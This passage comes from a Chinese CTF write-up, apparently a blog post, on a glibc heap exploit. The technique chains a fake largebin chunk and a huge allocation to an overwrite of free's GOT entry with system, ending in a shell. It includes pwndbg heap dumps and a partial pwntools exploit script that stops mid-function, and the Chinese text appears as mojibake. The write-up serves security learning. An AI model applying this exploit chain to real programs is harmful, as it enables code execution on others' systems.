chunk</li>\n<li>å¯¹ chunk è¿›è¡Œç®€æ˜“ç‰ˆçš„ free çš„ consolidation è¿‡ç¨‹</li>\n<li>å‘å‰åˆå¹¶</li>\n<li>å‘ååˆå¹¶</li>\n<li>æ’å…¥ unsortedbin</li>\n</ol>\n<p>è¿™é‡Œä¼šè¿›è¡Œå‘å‰å‘ååˆå¹¶çš„æ“ä½œï¼Œä¿®æ”¹ prev_inuse æ ‡å¿—ä¸º 1ï¼Œå¯ä»¥ä½¿å…¶ä¸å‘ä¸Šåˆå¹¶ï¼Œä½†æ˜¯ä¾ç„¶ä¼šè¿›è¡Œå‘ä¸‹åˆå¹¶çš„æ£€æŸ¥ï¼š</p>\n<ol>\n<li>ç”¨ chunk size + chunk addr è®¡ç®—å‡ºä¸‹ä¸€ä¸ª chunk æ‰€åœ¨ä½ç½®</li>\n<li>ç”¨ä¸‹ä¸€ä¸ª chunk size + å…¶ chunk addr è®¡ç®—å‡ºå†ä¸‹ä¸€ä¸ª chunk æ‰€åœ¨ä½ç½®ï¼Œç„¶ååˆ¤æ–­ prev_inuse ä½æ˜¯å¦æ˜¯ 1ï¼Œä¸æ˜¯ 1 å°±æ–­é“¾åˆå¹¶</li>\n</ol>\n</blockquote>\n<p>æ‰€ä»¥å½“è§¦å‘ <code>malloc consolidation</code>  æ—¶</p>\n<blockquote>\n<p>0e:0070â”‚  0x601350 (fake+16) â—‚â€” 0x0 ------------------------------------------------&gt;unsortedbin</p>\n<p>0f:0078â”‚  0x601358 (fake+24) â—‚â€” 0x11<br>\n10:0080â”‚  0x601360 (fake+32) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â€”â–¸ 0x1002420 â—‚â€” 0x0<br>\n11:0088â”‚  0x601368 (fake+40) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â€”â–¸ 0x1002420 â—‚â€” 0x0</p>\n</blockquote>\n<h5 id=\"2å‡†å¤‡-largebin\"><a class=\"markdownIt-Anchor\" href=\"#2å‡†å¤‡-largebin\">#</a> <strong>2. å‡†å¤‡ largebin</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add ä¹‹å‰</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â—‚â€” 0x601350<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x601370:\t0x0000000000000000\t0x0000000000000000<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>add ä¹‹å</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-âˆ: 0x601350 (fake+16) â€”â–¸ 0x7ffff7bc5348 (main_arena+2088) â—‚â€” 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>å…¶å®å°±æ˜¯ unsortbin éå† sizeï¼Œæ»¡è¶³åˆ‡å‰²åˆ†é…çš„åˆ‡å‰²åˆ†é…ï¼Œå¤§å°ç²¾ç¡®åŒ¹é…å°±åˆ†é…ï¼Œå¤§å°ä¸åŒ¹é…çš„å°±æ ¹æ®å¤§å°è£…å…¥ largebin å’Œ smallbinã€‚</p>\n<h5 id=\"3ç”³è¯·è¶…å¤§å†…å­˜æ§åˆ¶æŒ‡é’ˆæ•°ç»„\"><a class=\"markdownIt-Anchor\" href=\"#3ç”³è¯·è¶…å¤§å†…å­˜æ§åˆ¶æŒ‡é’ˆæ•°ç»„\">#</a> <strong>3. ç”³è¯·è¶…å¤§å†…å­˜æ§åˆ¶æŒ‡é’ˆæ•°ç»„</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add ä¹‹å‰</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-âˆ: 0x601350 (fake+16) â€”â–¸ 0x7ffff7bc5348 (main_arena+2088) â—‚â€” 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000000</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff6dff010\t0x0000000000602420<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000000000<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0xfffffffffffffff0\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xfffffffffffffff1<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>add ä¹‹å</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x6012d0 â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â—‚â€” 0x6012d0<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000071</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000601360<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0x0000000000000070\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xffffffffffffff81<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5335\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>å¯è§è¿™é‡Œæ— ç–‘å‘ç”Ÿäº†å‘ç”Ÿäº†å¾ˆå¤§çš„å˜åŒ–</p>\n<p>largebin è¢«ç½®å…¥ unsortedbin å†…</p>\n<p>æ¥ä¸‹æ¥æˆ‘ä»¬äº†è§£åŸå› </p>\n<blockquote>\n<ol>\n<li>unsortedbin å¤„ç†å®Œä¹‹åï¼Œä» largebin ä¸­æ‰¾æ»¡è¶³å¤§å°è¦æ±‚çš„ chunk åˆ†é…ï¼Œè¦ä¹ˆç›´æ¥åˆ†é…å‡ºå»ï¼Œè¦ä¹ˆåˆ‡å‰²åˆ†é…å‡ºå»ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†è£…å…¥ unsortedbin</li>\n<li>largebin ä¸­æœ€å¤§çš„ chunk èŒƒå›´æ˜¯ <code>0x80000 - âˆ</code></li>\n<li><strong>ä» largebin ä¸­åˆ†é…ä¸æ£€æŸ¥ç”³è¯·å¤§å°æ˜¯å¦è¶…å‡ºç³»ç»Ÿå†…å­˜</strong></li>\n</ol>\n</blockquote>\n<p>æ‰€ä»¥å½“æˆ‘ä»¬ç”³è¯·è¶…å¤§å†…å­˜æ—¶ï¼Œç”±äºæˆ‘ä»¬å°† largebin çš„ size ç½®æˆ <code>0xfffffffffffffff1</code> ï¼Œæ‰€ä»¥ç­‰æˆ‘ä»¬å»ç”³è¯· <code>0xFFFFFFFFFFFFFF70LL</code>  å°±ä¼šå°†å‰©ä½™çš„ 0x80 çš„ chunk å—æ”¾è¿› unsortedbin å†…ã€‚</p>\n<h5 id=\"4åŠ«æŒfree\"><a class=\"markdownIt-Anchor\" href=\"#4åŠ«æŒfree\">#</a> <strong>4. åŠ«æŒ free</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿™å°±æ˜¯ç”³è¯·ä¸€ä¸ª 0x80 çš„ chunk å—ï¼Œå¹¶å°† ptr [0] æŒ‡å‘ freeï¼Œæ¥ä¸‹æ¥ç”¨ edit å†™å…¥ç¨‹åºè‡ªå¸¦çš„ system å³å¯ï¼Œæœ€å free æ‰å†…å®¹ä¸º <code>/bin/sh</code>  çš„ chunk å—å³å¯</p>\n<h3 id=\"å®Œæ•´exp\"><a class=\"markdownIt-Anchor\" href=\"#å®Œæ•´exp\">#</a> å®Œæ•´ expï¼š</h3>\n<blockquote>\n<p>è„šæœ¬æ¥æºäºç½‘ç»œ</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #è®¾ç½®ç§å­</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ï¼š0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice >\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre> </pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 1 0x10</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 2 0x80</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 3 0xA0000</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'Add>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">,</span>content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Edt>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'content>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre> </pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    